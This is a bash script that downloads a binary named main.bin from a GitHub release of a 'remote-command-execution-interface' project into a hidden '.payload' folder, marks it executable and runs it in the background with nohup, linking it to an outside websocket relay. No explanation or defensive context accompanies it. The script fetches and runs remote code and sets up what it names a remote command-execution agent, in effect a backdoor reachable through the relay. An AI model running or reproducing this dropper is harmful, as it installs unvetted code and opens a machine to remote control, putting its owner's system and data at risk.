#!/bin/bash

set -e

# --- Config ---
RELEASE_NAME="v7-e5bcf6f31ee395ea71380c296e4d87c2bdb368bd"

BASE_URL="https://github.com/zaqks/remote-command-execution-interface/releases/download/${RELEASE_NAME}"

WORKDIR=".payload"

AGENT_NAME="main.bin"

RELAY_HOST_WS="wss://zaqks-relay.hf.space"
LOCAL_PORT="8888"

# --- Setup ---
mkdir -p "$WORKDIR"
cd "$WORKDIR"

wget -O "$AGENT_NAME" "${BASE_URL}/main.bin"

chmod +x "$AGENT_NAME"

# --- Run in background ---
nohup "./$AGENT_NAME" \
  --local-port "$LOCAL_PORT" \
  --relay-host-ws "$RELAY_HOST_WS" &

echo "Started relay-agent in background. Logs: $WORKDIR/run.log"